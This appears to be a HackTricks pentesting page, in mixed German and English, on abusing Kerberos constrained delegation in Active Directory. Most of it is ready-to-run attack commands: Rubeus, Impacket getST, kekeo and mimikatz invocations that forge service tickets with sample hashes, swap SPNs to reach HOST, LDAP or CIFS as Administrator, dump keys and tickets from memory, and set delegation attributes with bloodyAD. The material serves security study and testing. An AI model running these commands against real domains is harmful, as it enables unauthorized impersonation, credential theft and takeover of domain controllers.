# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Using this a Domain admin can **allow** a computer to **impersonate a user or computer** against any **service** of a machine.

- **Service for User to self (_S4U2self_):** Wenn ein **service account** einen _userAccountControl_-Wert enthält, der [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) beinhaltet, dann kann er ein TGS für sich selbst (den service) im Auftrag eines beliebigen anderen user erhalten.
- **Service for User to Proxy(_S4U2proxy_):** Ein **service account** könnte ein TGS im Auftrag eines beliebigen user für den in **msDS-AllowedToDelegateTo** gesetzten service erhalten. Dazu benötigt er zuerst ein TGS von diesem user zu sich selbst, kann aber S4U2self verwenden, um dieses TGS zu erhalten, bevor er das andere anfordert.

**Note**: If a user is marked as ‘_Account is sensitive and cannot be delegated_ ’ in AD, you will **not be able to impersonate** them.

Das bedeutet, dass, wenn du **compromise the hash of the service**, du **impersonate users** kannst und im Auftrag von ihnen **access** auf jeden **service** der angegebenen Maschinen erlangen kannst (möglicher **privesc**).

Außerdem wirst du **nicht nur Zugriff auf den service haben, den der user impersonate kann, sondern auch auf jeden beliebigen service**, weil der SPN (der angeforderte service name) nicht überprüft wird (in dem Ticket ist dieser Teil nicht verschlüsselt/signiert). Daher, wenn du Zugriff auf **CIFS service** hast, kannst du auch Zugriff auf **HOST service** erhalten, z.B. mit dem `/altservice` Flag in Rubeus. Dieselbe SPN swapping weakness wird durch **Impacket getST -altservice** und andere tooling ausgenutzt.

Außerdem ist **LDAP service access on DC** nötig, um einen **DCSync** auszunutzen.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Cross-domain constrained delegation Hinweise (2025+)

Seit **Windows Server 2012/2012 R2** unterstützt der KDC **constrained delegation across domains/forests** via S4U2Proxy extensions. Moderne Builds (Windows Server 2016–2025) behalten dieses Verhalten bei und fügen zwei PAC SIDs hinzu, um eine protocol transition zu signalisieren:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) wenn sich der Benutzer normal authentifiziert hat.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) wenn ein Dienst die Identität mittels protocol transition behauptet hat.

Erwarte `SERVICE_ASSERTED_IDENTITY` im PAC, wenn protocol transition über Domänen verwendet wird; das bestätigt, dass der S4U2Proxy-Schritt erfolgreich war.

### Impacket / Linux-Tools (altservice & full S4U)

Neuere Impacket-Versionen (0.11.x+) stellen dieselbe S4U-Kette und SPN-Swapping wie Rubeus bereit:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
Wenn Sie es vorziehen, zuerst das Benutzer-ST zu fälschen (z. B. nur Offline-Hash), kombinieren Sie **ticketer.py** mit **getST.py** für S4U2Proxy. Siehe das offene Impacket-Issue #1713 für aktuelle Macken (KRB_AP_ERR_MODIFIED, wenn das gefälschte ST nicht zum SPN-Schlüssel passt).

### Automatisieren der Delegierungs-Einrichtung von low-priv creds

Wenn Sie bereits **GenericAll/WriteDACL** über ein Computer- oder Servicekonto besitzen, können Sie die erforderlichen Attribute remote ohne RSAT mit **bloodyAD** (2024+) setzen:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Damit kannst du einen constrained delegation-Pfad für privesc aufbauen, ohne DA-Berechtigungen, sobald du diese Attribute setzen kannst.

- Schritt 1: **Get TGT of the allowed service**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Es gibt **andere Wege, ein TGT-Ticket zu erhalten** oder den **RC4** oder **AES256** ohne SYSTEM auf dem Computer zu sein, wie z. B. den Printer Bug und unconstrain delegation, NTLM relaying und Active Directory Certificate Service abuse
>
> **Wenn du dieses TGT-Ticket (oder dessen Hash) hast, kannst du diesen Angriff durchführen, ohne den gesamten Computer zu kompromittieren.**

- Schritt 2: **TGS für den Dienst erhalten, indem du den Benutzer impersonierst**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Mehr Informationen auf ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) and [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Quellen
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
